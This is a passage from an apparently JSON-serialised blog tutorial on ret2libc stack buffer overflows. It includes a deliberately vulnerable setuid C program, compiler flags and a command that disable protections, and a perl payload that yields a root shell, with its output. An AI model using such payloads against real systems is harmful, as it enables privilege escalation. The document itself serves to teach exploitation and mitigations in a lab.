whoami\n    root\n    @sh-4.4# exit\n    exit\n    [1]    9121 segmentation fault  bin/sof \n    \n\nWe successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the `exit` system call address instead. Doing so should give us a clean exit.\n\n    @gef➤  p exit\n    $2 = {\u003ctext variable, no debug info\u003e} 0xf7e1e8f0 \u003c__GI_exit\u003e\n    \n    @gef➤  q\n    \n\nReverse exit's address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  raddr -a 0xf7e1e8f0 \n    \\xf0\\xe8\\xe1\\xf7\n    \n\nAnd now replace the invalid return address with it in our payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒\n    \n\nAnd get a shell with a clean exit.\n\n## Brief overview of a few common buffer overflow protection mechanisms\n\n- \nASLR (Address Space Layout Randomization)\n\n- ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.\n\n- \nCanary\n\n- Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.\n\n- \nRELRO (RELocation Read-Only)\n\n- RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.\n\n- \nNX bit (Non-executable bit)\n\n- Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.\n\n- AMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.\n- Intel refers to it as the \"XD (eXecute Disabled) bit.\"\n- ARM refers to it as the \"XN (eXecute Never) bit.\"\n\n## Further Reading\n\n- [BOF protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection)\n- [Understanding Buffer Overflow Attacks](https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/)\n- [Stack - Abstract Data Type](https://en.wikipedia.org/wiki/Stack_(abstract_data_type))\n- [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html)\n- [0x00 sec](https://0x00sec.org/search?q=stack%20overflow)\n- [Black Hat - Difference between BOF preventions and weaknesses](https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf)\n- [Exploit Mitigation Techniques - DEP](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n- [Shellblade ret2libc](http://shellblade.net/docs/ret2libc.pdf)\n- [x64 ROP](https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937)\n- [UAF heap overflow](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)\n- [NOP sled](https://www.exploit-db.com/papers/13171/)\n\n## Tools\n\n- [GEF - GDB Enhanced Features](https://github.com/hugsy/gef/)\n- [SMAP - Shellcode Mapper](https://github.com/rootlabs/smap/)\n- [Radare2](https://github.com/radare/radare2/)\n- [Cutter - Radare2 QT GUI](https://github.com/radareorg/cutter)\n- [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\n- [pwntools](https://github.com/Gallopsled/pwntools)\n- [Unicorn - CPU emulator](http://www.unicorn-engine.org/)\n\n## Cheatsheets\n\n- [Memory Segmentation](https://i.imgur.com/Xe1m6C3.png)\n- [Reverse Engineering](https://i.imgur.com/ewrWkEa.png)\n- [radare2](https://github.com/radare/radare2/blob/master/doc/intro.md)\n\n## Other\n\n- [Shellcode Database](http://shell-storm.org/shellcode/)\n- [GDB documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/)\n- [GEF documentation](http://gef.readthedocs.io/en/master/)\n- [Linux 32bit syscalls](http://asm.sourceforge.net/syscall.html)\n","cover":"2019/01/gef.jpg","author":{"name":"th3v0id","avatar":"avatars/th3v0id.jpg"},"content":"\u003cp\u003eA stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.\u003c/p\u003e\n\u003cp\u003eIn this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the \u003ccode\u003esystem\u003c/code\u003e and \u003ccode\u003eexit\u003c/code\u003e sys calls for demonstration.\u003c/p\u003e\n\u003cp\u003eTo have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching \u003ca href=\"https://www.youtube.com/watch?v=7dLZRMDcY6c\"\u003estack\u003c/a\u003e and \u003ca href=\"https://www.youtube.com/watch?v=XbZQ-EonR_I\"\u003ecall stack\u003c/a\u003e.\u003c/p\u003e\n\u003ch2\u003eCreating a vulnerable binary to test on\u003c/h2\u003e\n\u003cp\u003eTo practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#include \u0026#x3C;string.h\u003e\n#include \u0026#x3C;unistd.h\u003e\n#include \u0026#x3C;sys/cdefs.h\u003e\n\nint main(int argc, char** argv) {\n\n    setuid(0);\n\n    if (argc \u003e 1) {\n        char buf[256];\n        strcpy(buf, argv[1]);\n    }\n\n    return 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFor the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003egcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-g\u003c/code\u003e: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-fno-stack-protector\u003c/code\u003e: Disables stack smashing protectors (SSP).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-z execstack\u003c/code\u003e: Makes stack frames executable.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-o sof\u003c/code\u003e: Output (compiled) binary name will be sof.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-mpreferred-stack-boundary=2\u003c/code\u003e: aligns the stack boundary in our binary to 4 bytes.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding \u003ccode\u003ekernel.randomize_va_space = 0\u003c/code\u003e to \u003ccode\u003e/etc/sysctl.conf\u003c/code\u003e or \u003ccode\u003eecho 0 \u003e /proc/sys/kernel/randomize_va_space\u003c/code\u003e. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to \u003ccode\u003ecat /proc/sys/kernel/randomize_va_space\u003c/code\u003e. If the output is a positive number, it's enabled.\u003c/p\u003e\n\u003ch2\u003eAssembler dump breakdown\u003c/h2\u003e\n\u003cp\u003eLet's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n⇒  gdb -q \tbin/sof                                              \n[*] No debugging session active\nGEF for linux ready, type `gef' to start, `gef config' to configure\n67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\nReading symbols from bin/sof...done.\n@gef➤  disassemble main\nDump of assembler code for function main:\n   0x08048416 \u0026#x3C;+0\u003e:\tpush   ebp\n   0x08048417 \u0026#x3C;+1\u003e:\tmov    ebp,esp\n   0x08048419 \u0026#x3C;+3\u003e:\tsub    esp,0x100\n   0x0804841f \u0026#x3C;+9\u003e:\tpush   0x0\n   0x08048421 \u0026#x3C;+11\u003e:\tcall   0x8048300 \u0026#x3C;setuid@plt\u003e\n   0x08048426 \u0026#x3C;+16\u003e:\tadd    esp,0x4\n   0x08048429 \u0026#x3C;+19\u003e:\tcmp    DWORD PTR [ebp+0x8],0x1\n   0x0804842d \u0026#x3C;+23\u003e:\tjle    0x8048447 \u0026#x3C;main+49\u003e\n   0x0804842f \u0026#x3C;+25\u003e:\tmov    eax,DWORD PTR [ebp+0xc]\n   0x08048432 \u0026#x3C;+28\u003e:\tadd    eax,0x4\n   0x08048435 \u0026#x3C;+31\u003e:\tmov    eax,DWORD PTR [eax]\n   0x08048437 \u0026#x3C;+33\u003e:\tpush   eax\n   0x08048438 \u0026#x3C;+34\u003e:\tlea    eax,[ebp-0x100]\n   0x0804843e \u0026#x3C;+40\u003e:\tpush   eax\n   0x0804843f \u0026#x3C;+41\u003e:\tcall   0x80482e0 \u0026#x3C;strcpy@plt\u003e\n   0x08048444 \u0026#x3C;+46\u003e:\tadd    esp,0x8\n   0x08048447 \u0026#x3C;+49\u003e:\tmov    eax,0x0\n   0x0804844c \u0026#x3C;+54\u003e:\tleave  \n   0x0804844d \u0026#x3C;+55\u003e:\tret    \nEnd of assembler dump.\n@gef➤  q\n\n\n   0x08048416 \u0026#x3C;+0\u003e:\tpush   ebp\n   0x08048417 \u0026#x3C;+1\u003e:\tmov    ebp,esp\n   0x08048419 \u0026#x3C;+3\u003e:\tsub    esp,0x100\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese first few lines above are called a function prologue. \u003ccode\u003epush ebp\u003c/code\u003e pushes our base pointer onto the stack. Then \u003ccode\u003emov ebp,esp\u003c/code\u003e copies the value of \u003ccode\u003eesp\u003c/code\u003e (stack pointer) into the \u003ccode\u003eebp\u003c/code\u003e register making \u003ccode\u003eebp\u003c/code\u003e == \u003ccode\u003eesp\u003c/code\u003e. Next, \u003ccode\u003esub esp,0x100\u003c/code\u003e moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for \u003ccode\u003echar buf[256]\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e   0x0804841f \u0026#x3C;+9\u003e:\tpush   0x0\n   0x08048421 \u0026#x3C;+11\u003e:\tcall   0x8048300 \u0026#x3C;setuid@plt\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePush 0 onto the stack as an argument for the call to \u003ccode\u003esetuid()\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e   0x08048426 \u0026#x3C;+16\u003e:\tadd    esp,0x4\n   0x08048429 \u0026#x3C;+19\u003e:\tcmp    DWORD PTR [ebp+0x8],0x1\n   0x0804842d \u0026#x3C;+23\u003e:\tjle    0x8048447 \u0026#x3C;main+49\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe next instruction \u003ccode\u003ecmp DWORD PTR [ebp+0x8],0x1\u003c/code\u003e compares the first argument of main (argc) to 1. The following \u003ccode\u003ejle\u003c/code\u003e instruction uses the result of this comparison. It takes the result and jumps to \u003ccode\u003e\u0026#x3C;main+39\u003e\u003c/code\u003e if the result is less than or equal to the value stored at \u003ccode\u003e0x8048412\u003c/code\u003e, which is 1. If you look at the C source above, you can see this is essentially our \u003ccode\u003eif (argc \u003e) {...}\u003c/code\u003e condition.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e   0x0804842f \u0026#x3C;+25\u003e:\tmov    eax,DWORD PTR [ebp+0xc]\n   0x08048432 \u0026#x3C;+28\u003e:\tadd    eax,0x4\n   0x08048435 \u0026#x3C;+31\u003e:\tmov    eax,DWORD PTR [eax]\n   0x08048437 \u0026#x3C;+33\u003e:\tpush   eax\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHere, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of \u003ccode\u003eargv[1]\u003c/code\u003e. Next, \u003ccode\u003emov eax,DWORD PTR [eax]\u003c/code\u003e takes the value at \u003ccode\u003eargv[1]\u003c/code\u003e and copies it into the \u003ccode\u003eeax\u003c/code\u003e register. \u003ccode\u003epush eax\u003c/code\u003e pushes this value onto the stack.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e   0x08048438 \u0026#x3C;+34\u003e:\tlea    eax,[ebp-0x100]\n   0x0804843e \u0026#x3C;+40\u003e:\tpush   eax\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003elea eax,[ebp-0x100]\u003c/code\u003e calculates the address of \u003ccode\u003eebp-0x100\u003c/code\u003e and stores the address in \u003ccode\u003eeax\u003c/code\u003e. \u003ccode\u003epush eax\u003c/code\u003e pushes this address onto the stack.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e   0x0804843f \u0026#x3C;+41\u003e:\tcall   0x80482e0 \u0026#x3C;strcpy@plt\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003ecall\u003c/code\u003e instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to \u003ccode\u003estrcpy@plt\u003c/code\u003e. The reason a return address is pushed onto the stack is so that when \u003ccode\u003estrcpy@plt\u003c/code\u003e finishes executing, the program knows where to return execution.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e   0x08048444 \u0026#x3C;+46\u003e:\tadd    esp,0x8\n   0x08048447 \u0026#x3C;+49\u003e:\tmov    eax,0x0\n   0x0804844c \u0026#x3C;+54\u003e:\tleave  \n   0x0804844d \u0026#x3C;+55\u003e:\tret    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. \u003ccode\u003eadd esp,0x8\u003c/code\u003e adds 8 bytes to the address \u003ccode\u003eesp\u003c/code\u003e points to. Then \u003ccode\u003emov eax,0x0\u003c/code\u003e zeros out whatever is stored in the \u003ccode\u003eeax\u003c/code\u003e register. The \u003ccode\u003eleave\u003c/code\u003e instruction does a couple of things. It releases the stack frame and then copies the base pointer (\u003ccode\u003eebp\u003c/code\u003e) into \u003ccode\u003eesp\u003c/code\u003e. This releases the space that was allocated to the previous stack frame. Finally, the \u003ccode\u003eret\u003c/code\u003e instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.\u003c/p\u003e\n\u003ch1\u003eExploiting the SOF vulnerability\u003c/h1\u003e\n\u003cp\u003eNow that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n⇒  bin/sof $(perl -e 'print \"A\" x 260')\n[1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.\u003c/p\u003e\n\u003ch2\u003eCreating the payload\u003c/h2\u003e\n\u003cp\u003eIn order to successfully call \u003ccode\u003esystem\u003c/code\u003e, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.\u003c/p\u003e\n\u003cp\u003eTo get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.\u003c/p\u003e\n\u003cp\u003eTo see the absolute path to the libc.so library that our binary uses, we use \u003ccode\u003eldd\u003c/code\u003e. This is needed for the next step.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  ldd bin/sof\n\tlinux-gate.so.1 (0xf7fd2000)\n\tlibc.so.6 =\u003e /lib/libc.so.6 (0xf7deb000)\n\t/lib/ld-linux.so.2 (0xf7fd4000)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNext, we use \u003ccode\u003estrings\u003c/code\u003e to report the offset of any string it finds in libc.so and grep the output for what we're after.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n 16a23e /bin/sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRunning \u003ccode\u003evmmap\u003c/code\u003e will also provide the starting address of libc.so when ran from a active gdb session.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n⇒  gdb -q bin/sof\n\n@gef➤  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n0xf7fa8000 0xf7fab000 0x00000000 rwx \n0xf7fcd000 0xf7fcf000 0x00000000 rwx \n0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n0xfffda000 0xffffe000 0x00000000 rwx [stack]\n\n@gef➤  q\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe calculate the address by taking the start address of \u003ccode\u003e/usr/lib/libc-2.26.so\u003c/code\u003e and add the offset of the string. I like to use \u003ccode\u003eprintf\u003c/code\u003e for this. If you use printf in gdb, you have to add \u003ccode\u003eshell\u003c/code\u003e before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n0xf7f5523e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTo verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e@gef➤  x/s 0xf7f5523e\n0xf7f5523e:\t\"/bin/sh\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAnd now, we just need the address of \u003ccode\u003esystem\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e@gef➤  p system\n$1 = {\u0026#x3C;text variable, no debug info\u003e} 0xf7e2c540 \u0026#x3C;__libc_system\u003e\n\n@gef➤  q\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBecause I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this \u003ca href=\"https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea\"\u003escript\u003c/a\u003e that takes a memory address and reverses it.\u003c/p\u003e\n\u003cp\u003eReverse system address\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  raddr -a 0xf7e2c540\n\\x40\\xc5\\xe2\\xf7\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eReverse \"/bin/sh\" string address\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  raddr -a 0xf7f5523e\n\\x3e\\x52\\xf5\\xf7\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAnd for the return address, we can use anything for the time being.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n⇒   raddr -a 0xdeadc0de\n\\xde\\xc0\\xad\\xd\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe modify the command we ran earlier, adding the reversed addresses onto the end of the payload.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#\n# [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n#\nth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n@sh-4.4# whoami\nroot\n@sh-4.4# exit\nexit\n[1]    9121 segmentation fault  bin/sof \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the \u003ccode\u003eexit\u003c/code\u003e system call address instead. Doing so should give us a clean exit.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e@gef➤  p exit\n$2 = {\u0026#x3C;text variable, no debug info\u003e} 0xf7e1e8f0 \u0026#x3C;__GI_exit\u003e\n\n@gef➤  q\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eReverse exit's address\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n⇒  raddr -a 0xf7e1e8f0 \n\\xf0\\xe8\\xe1\\xf7\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAnd now replace the invalid return address with it in our payload.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#\n# [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n#\nth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n@sh-4.4# whoami\nroot\n@sh-4.4# exit\nexit\nth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAnd get a shell with a clean exit.\u003c/p\u003e\n\u003ch2\u003eBrief overview of a few common buffer overflow protection mechanisms\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eASLR (Address Space Layout Randomization)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCanary\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eStack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRELRO (RELocation Read-Only)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eNX bit (Non-executable bit)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUsed to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eAMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIntel refers to it as the \"XD (eXecute Disabled) bit.\"\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eARM refers to it as the \"XN (eXecute Never) bit.\"\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eFurther Reading\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Buffer_overflow_protection\"\u003eBOF protection\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/\"\u003eUnderstanding Buffer Overflow Attacks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Stack_(abstract_data_type)\"\u003eStack - Abstract Data Type\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://insecure.org/stf/smashstack.html\"\u003eSmashing The Stack For Fun And Profit\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://0x00sec.org/search?q=stack%20overflow\"\u003e0x00 sec\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf\"\u003eBlack Hat - Difference between BOF preventions and weaknesses\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634\"\u003eExploit Mitigation Techniques - DEP\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://shellblade.net/docs/ret2libc.pdf\"\u003eShellblade ret2libc\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937\"\u003ex64 ROP\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580\"\u003eUAF heap overflow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.exploit-db.com/papers/13171/\"\u003eNOP sled\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eTools\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/hugsy/gef/\"\u003eGEF - GDB Enhanced Features\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/rootlabs/smap/\"\u003eSMAP - Shellcode Mapper\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/radare/radare2/\"\u003eRadare2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/radareorg/cutter\"\u003eCutter - Radare2 QT GUI\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.offensive-security.com/metasploit-unleashed/msfvenom/\"\u003eMSFvenom\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Gallopsled/pwntools\"\u003epwntools\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://www.unicorn-engine.org/\"\u003eUnicorn - CPU emulator\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eCheatsheets\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://i.imgur.com/Xe1m6C3.png\"\u003eMemory Segmentation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca 